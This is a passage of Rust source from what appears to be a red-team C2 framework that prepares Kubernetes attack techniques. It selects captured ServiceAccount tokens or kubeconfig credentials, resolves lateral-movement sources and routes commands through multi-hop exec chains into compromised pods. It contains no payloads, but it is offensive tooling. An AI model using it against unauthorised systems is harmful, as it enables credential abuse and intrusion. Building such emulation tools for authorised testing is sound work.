                args.insert(p.name.clone(), p.default.clone());
            }
        }
        ground_listener_defaults(&ttp, &mut args, self)?;
        normalize_string_list_params(&ttp, &mut args)?;
        validate_option_params(&ttp, &args)?;

        // This action's semantic target is the selected Pod. Never allow
        // legacy Namespace/PodName arguments to redirect execution elsewhere.
        if ttp.id == armory::VALID_ACCOUNTS_KUBECONFIG_ID {
            let Some((namespace, pod_name)) = split_pod_entity_id(&target_id) else {
                return Err(ExecuteActionError::InvalidInput(format!(
                    "action '{}' requires a Pod target in the form ns/<namespace>/pod/<name>",
                    ttp.id
                )));
            };
            for key in ["NAMESPACE", "NS"] {
                args.insert(key.to_string(), namespace.to_string());
            }
            for key in ["PODNAME", "POD_NAME"] {
                args.insert(key.to_string(), pod_name.to_string());
            }
            // Runtime context is authoritative and must replace stale values
            // embedded by plans exported before context args were filtered.
            args.insert("TARGET_ID".to_string(), target_id.clone());
            args.insert("SRC".to_string(), target_id.clone());
            args.remove("PROCEDURE_CMD");

            // The Kubernetes exec API requires an explicit container when a
            // Pod has more than one. Match kubectl's documented default by
            // selecting the first discovered container when the caller did
            // not make a selection. Keep an explicit value unchanged, and
            // retain the API default when container discovery has no data.
            if args
                .get("Container")
                .is_none_or(|container| container.trim().is_empty())
            {
                if let Some(container) = self
                    .entities
                    .find::<Pod>(&EntityId::new(&target_id))
                    .and_then(|pod| pod.containers.first())
                    .map(|container| container.name.clone())
                {
                    args.insert("Container".to_string(), container);
                }
            }
        }

        let mut procedure = self.select_procedure(&ttp, procedure_id.as_deref())?;
        let procedure_uses_k8s_auth = crate::ttp_applicability::procedure_uses_k8s_auth(&procedure);
        let resolved_auth = if procedure_uses_k8s_auth {
            let uses_default_kubeconfig = procedure.is_local_command == Some(true)
                && procedure.command.contains("kubectl ")
                && !procedure.command.contains("${K8S_AUTH}");
            if procedure.command.contains("kubectl ")
                && !procedure.command.contains("${K8S_AUTH}")
                && !uses_default_kubeconfig
                && !procedure
                    .command
                    .trim_start()
                    .starts_with("c2.kubectl_exec(")
            {
                return Err(ExecuteActionError::InvalidInput(format!(
                    "Kubernetes procedure '{}' must use ${{K8S_AUTH}} instead of TOKEN or ambient authentication",
                    procedure.id
                )));
            }

            let parameter_identity = args
                .remove("K8S_AUTH")
                .map(|identity| identity.trim().to_string())
                .filter(|identity| !identity.is_empty());
            let canonical_identity = requested_auth_identity_id
                .as_deref()
                .map(str::trim)
                .filter(|identity| !identity.is_empty())
                .map(str::to_string);
            let requested_identity = match (canonical_identity, parameter_identity) {
                (Some(canonical), Some(parameter)) if canonical != parameter => {
                    return Err(ExecuteActionError::InvalidInput(
                        "authIdentityId and args.K8S_AUTH select different identities".to_string(),
                    ));
                }
                (Some(canonical), _) => Some(canonical),
                (None, parameter) => parameter,
            };
            let legacy_token = args.remove("TOKEN").unwrap_or_default();
            if requested_identity.is_some() && !legacy_token.trim().is_empty() {
                return Err(ExecuteActionError::InvalidInput(
                    "Kubernetes authentication selectors and legacy args.TOKEN cannot be supplied together"
                        .to_string(),
                ));
            }

            let eligible_identities =
                crate::ttp_applicability::eligible_auth_identities(&ttp, self, &target_id);
            let legacy_identity = if legacy_token.trim().is_empty() {
                None
            } else if eligible_identities
                .iter()
                .any(|identity| identity.id == legacy_token.trim())
                && self
                    .entities
                    .find::<ServiceAccount>(&EntityId::new(legacy_token.trim()))
                    .is_some()
            {
                tracing::warn!(
                    action_id = %ttp.id,
                    "legacy args.TOKEN authentication selector is deprecated; use authIdentityId"
                );
                Some(legacy_token.trim().to_string())
            } else {
                return Err(ExecuteActionError::InvalidInput(
                    "legacy args.TOKEN must contain an eligible ServiceAccount entity ID; raw Kubernetes tokens are no longer accepted"
                        .to_string(),
                ));
            };
            let implicit_identity = eligible_identities
                .iter()
                .find(|identity| identity.id == target_id)
                .map(|identity| identity.id.clone())
                .or_else(|| {
                    (eligible_identities.len() == 1).then(|| eligible_identities[0].id.clone())
                });
            let identity_id = requested_identity.or(legacy_identity).or(implicit_identity);
            match identity_id {
                None if uses_default_kubeconfig => {
                    // An explicitly local procedure is executed on the Ran
                    // host, where kubectl can resolve its normal configuration.
                    // It has no Authenticate As binding to persist or display.
                    None
                }
                None => {
                    return Err(ExecuteActionError::InvalidInput(format!(
                        "action '{}' requires an Authenticate As identity",
                        ttp.id
                    )));
                }
                Some(identity_id) => {
                    if !eligible_identities
                        .iter()
                        .any(|identity| identity.id == identity_id)
                    {
                        return Err(ExecuteActionError::InvalidInput(format!(
                            "authentication identity '{}' is not eligible for action '{}'",
                            identity_id, ttp.id
                        )));
                    }

                    let entity_id = EntityId::new(&identity_id);
                    if let Some(account) = self.entities.find::<ServiceAccount>(&entity_id) {
                        let token = account.raw_token().ok_or_else(|| {
                            ExecuteActionError::InvalidInput(format!(
                                "ServiceAccount '{}' has no captured token",
                                identity_id
                            ))
                        })?;
                        Some(ResolvedK8sAuth::ServiceAccount {
                            id: identity_id,
                            token: token.to_string(),
                        })
                    } else if let Some(credential) = self.entities.find::<K8sCredential>(&entity_id)
                    {
                        let local_usable = credential.active
                            || self.is_operator_host_credential(&entity_id)
                            || crate::ttp_applicability::credential_has_replayable_auth(credential);
                        let source_context = procedure
                            .source_kubeconfig
                            .then(|| self.source_kubeconfig_exec_context(&entity_id))
                            .transpose()
                            .map_err(ExecuteActionError::InvalidInput)?;
                        if procedure.source_kubeconfig && source_context.is_none() {
                            return Err(ExecuteActionError::InvalidInput(format!(
                                "K8sCredential '{}' has no usable source kubeconfig",
                                identity_id
                            )));
                        }
                        if !procedure.source_kubeconfig && !local_usable {
                            return Err(ExecuteActionError::InvalidInput(format!(
                                "K8sCredential '{}' is only usable through its source system; select the source-kubeconfig procedure",
                                identity_id
                            )));
                        }
                        let (source_root, source_path) = source_context
                            .map(|(root, path)| (Some(root), Some(path)))
                            .unwrap_or((None, None));
                        Some(ResolvedK8sAuth::Kubeconfig {
                            id: identity_id,
                            context: credential.context_name.clone(),
                            source_path,
                            source_root,
                        })
                    } else {
                        return Err(ExecuteActionError::InvalidInput(format!(
                            "authentication identity '{}' is neither a captured ServiceAccount nor a usable local K8sCredential",
                            identity_id
                        )));
                    }
                }
            }
        } else {
            None
        };
        let auth_identity_id = resolved_auth
            .as_ref()
            .map(|auth| auth.id().to_string())
            .or_else(|| requested_auth_identity_id.filter(|identity| !identity.trim().is_empty()));
        let use_kubeconfig = resolved_auth
            .as_ref()
            .is_some_and(ResolvedK8sAuth::uses_kubeconfig);

        // Stage 2: normalise the caller-supplied routing hint.
        let exec_hint = normalise_exec_hint(exec_system_id.as_deref(), &target_id);

        // Stage 3: inject context args (NS / NODE / TOKEN) from the target entity
        // before template substitution so cross-param references like `${NS}` in
        // arg defaults resolve correctly.
        ground_args_from_context(&mut args, &target_id, self);
        if self
            .entities
            .contains::<K8sCluster>(&EntityId::new(&target_id))
        {
            let default_namespace = resolved_auth
                .as_ref()
                .and_then(|auth| match auth {
                    ResolvedK8sAuth::Kubeconfig { id, .. } => self
                        .entities
                        .find::<K8sCredential>(&EntityId::new(id))
                        .and_then(|credential| credential.default_namespace.clone()),
                    ResolvedK8sAuth::ServiceAccount { .. } => None,
                })
                .unwrap_or_else(|| "default".to_string());
            for param in &ttp.params {
                let is_namespace_param = param.param_type.eq_ignore_ascii_case("Namespace")
                    || param.name.eq_ignore_ascii_case("Namespace")
                    || param.name.eq_ignore_ascii_case("NS");
                if is_namespace_param
                    && args
                        .get(&param.name)
                        .is_none_or(|value| value.trim().is_empty())
                {
                    args.insert(param.name.clone(), default_namespace.clone());
                }
            }
        }
        if resolved_auth.is_some() {
            args.remove("TOKEN");
        }
        if let Some(ResolvedK8sAuth::Kubeconfig {
            source_root: Some(root),
            ..
        }) = &resolved_auth
        {
            args.insert(
                "KUBECONFIG_ROOT".to_string(),
                shell_words::quote(root).into_owned(),
            );
        }

        // Stage 4: resolve lateral-movement source and inject SRC - single,
        // authoritative site.  For non-lateral TTPs this is a no-op.
        let lateral_src = self.resolve_lateral_src(&ttp.tactic, exec_hint.as_deref(), &mut args)?;

        // For non-lateral TTPs resolve_lateral_src leaves SRC unset, but TTP
        // authors may still use ${SRC.PROP} to reference properties of the
        // executing entity (e.g. ${SRC.MOUNT_PATH} for host-path mounts).
        // For non-lateral TTPs the command runs ON the target, so SRC = target.
        if !args.contains_key("SRC") {
            args.insert("SRC".to_string(), target_id.clone());
        }

        // Stage 4.5: expand ${REF.PROP} placeholders in arg values now that SRC
        // and TARGET_ID are both present (e.g. ${SRC.MOUNT_PATH} → first host path,
        // ${TARGET.IP} → target entity's IP address).
        // TARGET_ID must be injected before ground_entity_ref_vars so that
        // ${TARGET.*} references in parameter defaults (e.g. CIDR = "${TARGET.IP}/24")
        // are resolved correctly.
        args.entry("TARGET_ID".to_string())
            .or_insert_with(|| target_id.clone());
        ground_entity_ref_vars(&mut args, self);

        // Stage 5: ground the procedure command and effects. K8S_AUTH is an
        // ephemeral built-in and is removed from persisted execution args.
        if let Some(auth) = &resolved_auth {
            args.insert("K8S_AUTH".to_string(), auth.kubectl_arg());
        }
        ground_procedure_and_effects(&mut procedure, &mut ttp.effects, &mut args, &ttp.id);
        args.remove("K8S_AUTH");
        if is_local_control_command(&procedure.command)
            && matches!(resolved_auth, Some(ResolvedK8sAuth::ServiceAccount { .. }))
        {
            return Err(ExecuteActionError::InvalidInput(format!(
                "procedure '{}' uses the active Kubernetes client and cannot realize a ServiceAccount Authenticate As identity",
                procedure.id
            )));
        }
        if use_kubeconfig {
            if procedure.command.trim().is_empty() {
                if let Some(request) = procedure.k8s_request.clone() {
                    procedure.command = describe_k8s_request(&procedure.id, request)?;
                } else if let Some(request) = procedure.http_request.clone() {
                    procedure.command =
                        describe_authenticated_http_request(&procedure.id, request)?;
                }
            }
            let supported = crate::ttp_applicability::procedure_uses_k8s_auth(&procedure);
            if !supported {
                return Err(ExecuteActionError::InvalidInput(format!(
                    "procedure '{}' does not support kubeconfig authentication",
                    procedure.id
                )));
            }
        } else {
            materialize_k8s_request(
                &mut procedure,
                armory,
                resolved_auth.as_ref().and_then(ResolvedK8sAuth::token),
            )?;
        }
        materialize_steps(&mut procedure, armory)?;
        if !use_kubeconfig {
            materialize_abstract_http_request(
                &mut procedure,
                armory,
                resolved_auth.as_ref().and_then(ResolvedK8sAuth::token),
            )?;
        }

        // Stage 6: resolve C2 channel (may wrap procedure.command for multi-hop).
        let route = self.route_exec_channel(
            &target_id,
            &ttp.tactic,
            &mut procedure,
            &args,
            auth_identity_id.as_deref(),
            exec_hint.as_deref(),
            lateral_src,
        )?;

        let cmd_id = generate_cmd_id();

        // Record the traversal breakdown as side data keyed by command id - kept
        // off `ExecTtp`/`ExecutionRecord` so it never touches the execution or
        // scoring data model. Surfaced by the flow API by joining on id.
        if let Some(traversal) = self.build_command_traversal(&route, &procedure.command) {
            tracing::info!(
                cmd_id = %cmd_id,
                target_id = %route.target_id,
                backend_id = %route.backend_id,
                route_reason = %traversal.reason,
                "resolved execution route"
            );
            self.command_traversals.insert(cmd_id.clone(), traversal);
        }

        Ok(ExecTtp {
            id: cmd_id,
            ttp,
            procedure,
            args,
            target_id: route.target_id,
            exec_chain: route.exec_chain,
            exec_system_id: route.backend_id,
            auth_identity_id,
            started_at_ms: current_time_millis(),
            execution_timeout_seconds: c2::DEFAULT_EXECUTION_TIMEOUT_SECONDS,
            output_transform: route.output_transform,
            is_cleanup: false,
            reasoning: String::new(),
        })
    }

    pub fn build_cleanup_actions(&mut self, armory: &Armory) -> Vec<ExecTtp> {
        let records: Vec<crate::execution_record::ExecutionRecord> = self.execution_records.clone();

        let mut actions = Vec::new();

        for record in records.iter().rev() {
            if record.is_cleanup {
                continue;
            }

            let Some(ttp) = armory.get_ttp(&record.ttp_id) else {
                continue;
            };

            let Some(ref cleanup_proc) = ttp.cleanup else {
                continue;
            };

            let cleanup_ttp = Ttp {
                description: ttp.description.clone(),
                techniques: ttp.techniques.clone(),
                status: ttp.status.clone(),
                params: ttp.params.clone(),
                requires: ttp.requires.clone(),
                procedures: vec![cleanup_proc.clone()],
                ..Ttp::new(
                    format!("{}_cleanup", ttp.id),
                    format!("{} Cleanup", ttp.name),
                    ttp.tactic.clone(),
                )
            };

            match self.prepare_action_with_ttp(
                record.target_id.clone(),
                None,
                record.auth_identity_id.clone(),
                Some(cleanup_proc.id.clone()),
                cleanup_ttp,
                record.args.clone(),
                armory,
            ) {
                Ok(mut exec) => {
                    exec.is_cleanup = true;
                    actions.push(exec);
                }
                Err(e) => {
                    tracing::warn!(
                        ttp_id = %record.ttp_id,
                        target_id = %record.target_id,
                        error = ?e,
                        "failed to build cleanup action; skipping"
                    );
                }
            }
        }

        actions
    }

    fn assert_target_exists(&self, target_id: &str) -> Result<(), ExecuteActionError> {
        let exists = self
            .get_entities()
            .into_iter()
            .any(|entity| entity.entity_id().0 == target_id);
        if !exists {
            return Err(ExecuteActionError::NotFound(format!(
                "failed to get target entity: {}",
                target_id
            )));
        }
        Ok(())
    }

    /// Resolve the lateral-movement execution source and inject `SRC`/`src`
    /// into `args`.
    ///
    /// This is the **single** place where `${SRC}` is injected for Lateral
    /// Movement TTPs.  The old code had two separate injection sites - one for a
    /// caller-supplied entity hint and one for the graph-resolved source - that
    /// could conflict when both conditions were true.  They are unified here.
    ///
    /// Returns the resolved [`ExecChannel`] so [`route_exec_channel`] can reuse
    /// it without hitting the graph a second time.  Returns `Ok(None)` for
    /// non-lateral TTPs.
    fn resolve_lateral_src(
        &self,
        tactic: &str,
        exec_hint: Option<&str>,
        args: &mut HashMap<String, String>,
    ) -> Result<Option<ExecChannel>, ExecuteActionError> {
        if !is_lateral_movement_tactic(tactic) {
            return Ok(None);
        }

        // Case A: caller explicitly nominated a source that is a known system entity.
        if let Some(hint) = exec_hint {
            if self.get_system_entity(hint).is_some() {
                args.insert("SRC".to_string(), hint.to_string());
                args.insert("src".to_string(), hint.to_string());
                let mut channel = self
                    .resolve_exec_channel(hint)
                    .map_err(ExecuteActionError::NoExecChannel)?;
                channel.exec_target_id = Some(hint.to_string());
                return Ok(Some(channel));
            }
        }

        // Case B: auto-resolve from the graph (no hint, or hint is not a known
        // system entity - treated as a backend ID, which doesn't give us a SRC).
        let ch = self
            .resolve_exec_source()
            .map_err(ExecuteActionError::NoExecChannel)?;
        if let Some(ref src_id) = ch.exec_target_id {
            args.insert("SRC".to_string(), src_id.clone());
            args.insert("src".to_string(), src_id.clone());
        }
        Ok(Some(ch))
    }

    /// Select a C2 backend and return `(backend_id, semantic_target_id, exec_chain, output_transform)`.
    ///
    /// - `semantic_target_id` is always the original `target_id` from the request - used for
    ///   attribution (execution records, effect context `TARGET_ID`, knowledge graph updates).
    /// - `exec_chain` is the ordered list of physical execution hops from the BuiltinC2 entry
    ///   point to the final destination.
    /// - `output_transform` is set when the channel wraps its output (e.g. ran-ws JSON envelope)
    ///   and the raw result must be post-processed before parsers run.
    ///
    /// Decision order (first matching branch wins):
    /// 1. Lateral Movement tactic → [`route_lateral_movement`] (uses pre-resolved src).
    /// 2. Caller supplied a non-empty exec hint → [`route_caller_supplied`].
    /// 3. Remote channel needed (tactic / procedure flag) → [`route_remote`].
    /// 4. Everything else → [`route_fallback`] (pod targets get in-cluster source).
    #[allow(clippy::too_many_arguments)]
    fn route_exec_channel(
        &mut self,
        target_id: &str,
        tactic: &str,
        procedure: &mut Procedure,
        args: &HashMap<String, String>,
        auth_identity_id: Option<&str>,
        exec_hint: Option<&str>,
        lateral_src: Option<ExecChannel>,
    ) -> Result<ExecRoute, ExecuteActionError> {
        if procedure.run_on_target == Some(false) {
            return self.route_source_side(target_id, procedure, args, exec_hint);
        }

        if auth_identity_id.is_some_and(|identity| identity.starts_with("k8s/credential/"))
            && crate::ttp_applicability::procedure_uses_k8s_auth(procedure)
            && !procedure.source_kubeconfig
        {
            return Ok(ExecRoute::direct(
                BUILTIN_C2_ID.to_string(),
                target_id.to_string(),
                vec![],
                None,
            ));
        }
        if is_local_control_command(&procedure.command) {
            tracing::info!(
                target_id = %target_id,
                command = %procedure.command,
                "routing local control command via builtin c2"
            );
            return Ok(ExecRoute::direct(
                String::new(),
                target_id.to_string(),
                vec![],
                None,
            ));
        }

        if is_lateral_movement_tactic(tactic) {
            return route_lateral_movement(lateral_src, target_id);
        }

        if let Some(hint) = exec_hint.filter(|s| !s.trim().is_empty()) {
            return self.route_caller_supplied(hint, target_id, procedure, args);
        }

        if needs_remote_channel(procedure, tactic) {
            return self.route_remote(target_id, procedure, args);
        }

        self.route_fallback(target_id)
    }

    /// Execute a target-oriented command from a different reachable system.
    ///
    /// The semantic target and its grounded `${TARGET.*}` context stay intact,
    /// but neither the selected execution system nor any hop used to reach it
    /// may be the target. This prevents client commands from being wrapped in
    /// an execution edge into the service they are trying to contact.
    fn route_source_side(
        &mut self,
        target_id: &str,
        procedure: &mut Procedure,
        args: &HashMap<String, String>,
        exec_hint: Option<&str>,
    ) -> Result<ExecRoute, ExecuteActionError> {
        let canonical_target = self.canonical_entity_id(target_id);
        let source_hint = exec_hint
            .map(|hint| self.canonical_entity_id(hint))
            .filter(|hint| hint != &canonical_target);

        let channel = if let Some(source_id) = source_hint {
            if self.get_system_entity(&source_id).is_none() {
                return Err(ExecuteActionError::NoExecChannel(format!(
                    "source-side procedure requires a reachable system, but '{}' is not a system entity",
                    source_id
                )));
            }
            let mut channel = self
                .resolve_exec_channel(&source_id)
                .map_err(ExecuteActionError::NoExecChannel)?;
            channel.exec_target_id = Some(source_id);
            channel
        } else {
            self.resolve_exec_source_excluding(Some(&canonical_target))
                .map_err(ExecuteActionError::NoExecChannel)?
        };

        let exec_target = channel.exec_target_id.clone().ok_or_else(|| {
            ExecuteActionError::InvariantViolation(
                "source-side execution resolved no physical execution system".to_string(),
            )
        })?;
        let route_systems = channel.hops.iter().chain(std::iter::once(&exec_target));
        if route_systems
            .map(|id| self.canonical_entity_id(id))
            .any(|id| id == canonical_target)
        {
            return Err(ExecuteActionError::NoExecChannel(format!(
                "source-side procedure cannot traverse selected target '{}'",
                target_id
            )));
        }

        tracing::info!(
            target_id = %target_id,
            exec_target = %exec_target,
            backend_id = %channel.backend_id,
            chain = %format_exec_chain(&channel.backend_id, &channel.hops, &exec_target),
            "selected source-side execution route"
        );

        if channel.hops.is_empty() {
            if let Some(source) = self.get_system_entity(&exec_target) {
                procedure.command =
                    ground_binaries(&procedure.command, &source.entity().system().binaries);
            }
            return Ok(ExecRoute::direct(
                channel.backend_id,
                target_id.to_string(),
                vec![exec_target],
                None,
            ));
        }

        let wrap = self.wrap_command_for_hops(procedure, &channel.hops, &exec_target, args);
        let exec_chain = channel
            .hops
            .into_iter()
            .chain(std::iter::once(exec_target))
            .collect();
        Ok(ExecRoute {
            backend_id: channel.backend_id,
            target_id: target_id.to_string(),
            exec_chain,
            output_transform: wrap.output_transform,
            traversal: wrap.traversal,
            inner_command: wrap.inner_command,
        })
    }

    /// Route to a caller-supplied system entity or C2 backend ID.
    ///
    /// If the hint resolves to a known system entity, or looks like an entity ID
    /// (starts with `ns/` or `node/` - handles stale/merged pod references),
    /// it becomes the exec entity via the builtin C2.  Otherwise it is treated as
    /// an explicit C2 backend ID and the logical target is kept as the exec entity.
    ///
    fn route_caller_supplied(
        &self,
        hint: &str,
        target_id: &str,
        procedure: &mut Procedure,
        args: &HashMap<String, String>,
    ) -> Result<ExecRoute, ExecuteActionError> {
        let hint_is_exec_entity = self.get_system_entity(hint).is_some()
            || hint.starts_with("ns/")
            || hint.starts_with("node/");

        if hint_is_exec_entity {
            let target_is_pod = self.entities.contains::<Pod>(&EntityId::new(target_id));

            // For Pod targets, a caller-supplied system is a source from which
            // to reach that target.
            if hint != target_id && target_is_pod {
                let ch = self
                    .resolve_exec_channel_from_source_inner(hint, target_id)
                    .map_err(ExecuteActionError::NoExecChannel)?;

                let exec_target = ch
                    .exec_target_id
                    .clone()
                    .unwrap_or_else(|| target_id.to_string());

                tracing::info!(
                    logical_target = %target_id,
                    selected_source = %hint,
                    backend_id = %ch.backend_id,
                    chain = %format_exec_chain(ch.backend_id.as_str(), &ch.hops, exec_target.as_str()),
                    "using caller-supplied exec source as route origin"
                );

                if ch.hops.is_empty() {
                    if exec_target == hint {
                        return Ok(ExecRoute::direct(
                            ch.backend_id,
                            target_id.to_string(),
                            vec![hint.to_string()],
                            None,
                        ));
                    }
                    let wrap = self.wrap_command_for_hops(
                        procedure,
                        &[hint.to_string()],
                        exec_target.as_str(),
                        args,
                    );
                    return Ok(ExecRoute {
                        backend_id: ch.backend_id,
                        target_id: target_id.to_string(),
                        exec_chain: vec![hint.to_string(), exec_target],
                        output_transform: wrap.output_transform,
                        traversal: wrap.traversal,
                        inner_command: wrap.inner_command,
                    });
                }

                let wrap =
                    self.wrap_command_for_hops(procedure, &ch.hops, exec_target.as_str(), args);
                let exec_chain: Vec<String> = ch
                    .hops
                    .iter()
                    .cloned()
                    .chain(std::iter::once(exec_target))
                    .collect();

                return Ok(ExecRoute {
                    backend_id: ch.backend_id,
                    target_id: target_id.to_string(),
                    exec_chain,
                    output_transform: wrap.output_transform,
                    traversal: wrap.traversal,
                    inner_command: wrap.inner_command,
                });
            }

            // For non-system semantic targets such as ServiceAccounts, the
            // selected system is the physical destination of the command. It
            // must be reached through its known execution channel, rather than
            // assuming BuiltinC2 can exec into it directly. This preserves RCE
            // and other non-kubectl routes into a compromised workload.
            if !target_is_pod {
                let ch = self
                    .resolve_exec_channel(hint)
                    .map_err(ExecuteActionError::NoExecChannel)?;
                let exec_target = ch
                    .exec_target_id
                    .clone()
                    .unwrap_or_else(|| hint.to_string());

                if ch.hops.is_empty() {
                    if let Some(sys) = self.get_system_entity(&exec_target) {
                        procedure.command =
                            ground_binaries(&procedure.command, &sys.entity().system().binaries);
                    }
                    return Ok(ExecRoute::direct(
                        ch.backend_id,
                        target_id.to_string(),
                        vec![exec_target],
                        None,
                    ));
                }

                let wrap = self.wrap_command_for_hops(procedure, &ch.hops, &exec_target, args);
                let exec_chain: Vec<String> = ch
                    .hops
                    .iter()
                    .cloned()
                    .chain(std::iter::once(exec_target))
                    .collect();
                return Ok(ExecRoute {
                    backend_id: ch.backend_id,
                    target_id: target_id.to_string(),
                    exec_chain,
                    output_transform: wrap.output_transform,
                    traversal: wrap.traversal,
                    inner_command: wrap.inner_command,
                });
            }

            let backend_id = self
                .resolve_exec_channel(hint)
                .map_err(ExecuteActionError::NoExecChannel)?
                .backend_id;
            tracing::info!(
                logical_target = %target_id,
                selected_source = %hint,
                backend_id = %backend_id,
                chain = %format_exec_chain(&backend_id, &[], hint),
                "using caller-supplied exec source entity"
            );
            // The selected system is also the physical destination for this
            // direct Pod execution, so use its resolved binary paths.
            if let Some(sys) = self.get_system_entity(hint) {
                procedure.command =
                    ground_binaries(&procedure.command, &sys.entity().system().binaries);
            }
            Ok(ExecRoute::direct(
                backend_id,
                target_id.to_string(),
                vec![hint.to_string()],
                None,
            ))
        } else {
            tracing::info!(
                target_id = %target_id,
                backend_id = %hint,
                chain = %format_exec_chain(hint, &[], target_id),
                "using caller-supplied exec backend"
            );
            Ok(ExecRoute::direct(
                hint.to_string(),
                target_id.to_string(),
                vec![target_id.to_string()],
                None,
            ))
        }
    }

    /// Route through a graph-resolved exec channel, wrapping the command for
    /// any intermediate hops.
    ///
    /// The chain's first element is what BuiltinC2 directly execs into (first hop for
    /// multi-hop paths), and the last element is the final pod where the command runs.
    fn route_remote(
        &mut self,
        target_id: &str,
        procedure: &mut Procedure,
        args: &HashMap<String, String>,
    ) -> Result<ExecRoute, ExecuteActionError> {
        let ch = self
            .resolve_exec_channel(target_id)
            .map_err(ExecuteActionError::NoExecChannel)?;
        let exec_target = ch
            .exec_target_id
            .clone()
            .unwrap_or_else(|| target_id.to_string());

        tracing::warn!(
            target_id = %target_id,
            exec_target = %exec_target,
            "resolved exec channel for action target",
        );
        tracing::info!("channel backend: {}, hops: {:?}", ch.backend_id, ch.hops);
        tracing::info!(
            target_id = %target_id,
            backend_id = %ch.backend_id,
            chain = %format_exec_chain(ch.backend_id.as_str(), &ch.hops, exec_target.as_str()),
            "selected remote execution chain"
        );

        if ch.hops.is_empty() {
            // Direct path: C2 can reach the target without any hop.
            // Ground all command-name occurrences against the target pod's binary
            // map so non-standard install paths (e.g. /tmp/kubectl) are used correctly.
            let tgt_id = EntityId::new(exec_target.as_str());
            if let Some(pod) = self.entities.find::<Pod>(&tgt_id) {
                procedure.command = ground_binaries(&procedure.command, &pod.system.binaries);
            }
            Ok(ExecRoute::direct(
                ch.backend_id,
                target_id.to_string(),
                vec![exec_target.clone()],
                None,
            ))
        } else {
            let wrap = self.wrap_command_for_hops(procedure, &ch.hops, exec_target.as_str(), args);
            let exec_chain: Vec<String> = ch
                .hops
                .iter()
                .cloned()
                .chain(std::iter::once(exec_target))
                .collect();
            Ok(ExecRoute {
                backend_id: ch.backend_id,
                target_id: target_id.to_string(),
                exec_chain,
                output_transform: wrap.output_transform,
                traversal: wrap.traversal,
                inner_command: wrap.inner_command,
            })
        }
    }

    /// Safety fallback: pod targets get an in-cluster execution source when no
    /// explicit channel was selected; all other targets get an empty backend
    /// (the C2 side will execute directly against the target).
    fn route_fallback(&self, target_id: &str) -> Result<ExecRoute, ExecuteActionError> {
        let target_eid = EntityId::new(target_id);
        if self.entities.contains::<Pod>(&target_eid) {
            tracing::warn!(
                target_id = %target_id,
                "no explicit exec channel selected for pod target; falling back to in-cluster source"
            );
            let ch = self
                .resolve_exec_source()
                .map_err(ExecuteActionError::NoExecChannel)?;
            let exec_entity = ch.exec_target_id.unwrap_or_else(|| target_id.to_string());
            tracing::info!(
                target_id = %target_id,
                selected_source = %exec_entity,
                backend_id = %ch.backend_id,
                chain = %format_exec_chain(ch.backend_id.as_str(), &ch.hops, exec_entity.as_str()),
                "pod fallback source selected"
            );
            Ok(ExecRoute::direct(
                ch.backend_id,
                target_id.to_string(),
                vec![exec_entity],
                None,
            ))
        } else {
            Ok(ExecRoute::direct(
                String::new(),
                target_id.to_string(),
                vec![],
                None,
            ))
        }
    }

    /// Assemble the traversal breakdown for a routed command, for display in the
    /// operation timeline. The chain always begins with the C2 entry hop
    /// (C2 → first system), so a direct single-hop command (e.g. a pod-exec the
    /// backend performs) is shown consistently with a multi-system pivot.
    ///
    /// Returns `None` only for local C2-side commands that don't run on any
    /// remote system.
    fn build_command_traversal(
        &self,
        route: &ExecRoute,
        final_command: &str,
    ) -> Option<CommandTraversal> {
        // A command tunneling over an established session: replay the full path
        // captured when the session was set up, with this command as the inner.
        if route.traversal.is_empty() {
            if let Some(hops) = self.session_traversals.get(&route.backend_id) {
                return Some(CommandTraversal {
                    hops: hops.clone(),
                    inner_command: final_command.to_string(),
                    reason: self.route_reason(route),
                });
            }
        }

        // Local C2-side command (empty backend / no exec chain) - nothing runs
        // on a remote system, so there is no traversal to show.
        let first = route.exec_chain.first()?;
        if route.backend_id.is_empty() {
            return None;
        }

        // C2 entry hop (C2 → first system), then the system-to-system graph hops
        // captured by `wrap_command_for_hops` (empty for a direct command).
        let mut hops = Vec::with_capacity(route.traversal.len() + 1);
        hops.push(TraversalHop {
            from_id: route.backend_id.clone(),
            to_id: first.clone(),
            relation: entry_relation(&route.backend_id, first).to_string(),
            envelope: None,
            command: final_command.to_string(),
        });
        hops.extend(route.traversal.iter().cloned());

        let inner_command = if route.inner_command.is_empty() {
            // Direct command: the bare command runs on the target itself.
            final_command.to_string()
        } else {
            route.inner_command.clone()
        };
        Some(CommandTraversal {
            hops,
            inner_command,
            reason: self.route_reason(route),
        })
    }

    /// Build a short, human-readable explanation of why `route` was chosen, from
    /// the finalized route shape. Kept honest and derived from the route itself
    /// (rather than the resolver's internal branch) so it never drifts from what
    /// actually ran, and flags when a broken session edge to the target was
    /// skipped - the visible counterpart to the resolver's decision logs.
    fn route_reason(&self, route: &ExecRoute) -> String {
        let exec_target = route
            .exec_chain
            .last()
            .map(String::as_str)
            .unwrap_or(route.target_id.as_str());

        let mut reason = if route.backend_id.starts_with("session/") {
            format!("Tunneled through live session {}", route.backend_id)
        } else if route.exec_chain.len() > 1 {
            format!(
                "Multi-hop route {}",
                format_exec_chain(&route.backend_id, &route.exec_chain, exec_target)
            )
        } else if route.backend_id.is_empty() {
            "Local C2-side command (no remote hop)".to_string()
        } else {
            format!("Direct exec from {}", route.backend_id)
        };

        // If a session edge into the exec target exists but is broken, the router
        // stepped around it - call that out so an operator understands why the
        // path is not the (now-dead) session they might expect.
        if self.has_broken_exec_edge_into(exec_target) && !route.backend_id.starts_with("session/")
        {
            reason.push_str(" (a broken session edge to the target was skipped)");
        }

        reason
    }

    /// Whether any incoming exec-channel edge into `target_id` is currently
    /// marked broken. Used only to annotate the route reason.
    fn has_broken_exec_edge_into(&self, target_id: &str) -> bool {
        let eid = EntityId::new(target_id);
        self.graph
            .incoming(&eid)
            .into_iter()
            .any(|(_, d)| d.is_exec_channel && d.broken)
    }

    /// Wrap `procedure.command` through each hop in reverse order so BuiltinC2
    /// can exec into the first hop and the nested command traverses the rest of
    /// the chain to the final execution target.
    ///
    /// Returns the `OutputTransform` required to decode the raw output (if any),
    /// the bare inner command as it runs on the final target, and the
    /// system-to-system [`TraversalHop`] breakdown (excluding the C2 entry hop,
    /// which is prepended uniformly in `build_command_traversal`).
    /// Currently only `kubelet-pod-exec` hops produce wrapped output (ran-ws JSON envelope).
    fn wrap_command_for_hops(
        &self,
        procedure: &mut Procedure,
        hops: &[String],
        exec_target: &str,
        args: &HashMap<String, String>,
    ) -> HopWrap {
        let full_chain: Vec<&str> = hops
            .iter()
            .map(String::as_str)
            .chain(std::iter::once(exec_target))
            .collect();

        let mut output_transform: Option<OutputTransform> = None;
        // Hops are recorded innermost-first as the loop wraps from the inside
